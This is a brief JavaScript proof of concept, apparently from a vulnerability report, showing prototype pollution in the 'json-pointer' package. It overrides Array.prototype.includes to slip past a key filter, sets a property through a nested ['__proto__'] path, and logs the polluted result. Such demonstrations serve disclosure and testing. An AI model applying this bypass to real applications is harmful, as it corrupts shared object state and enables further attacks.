Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);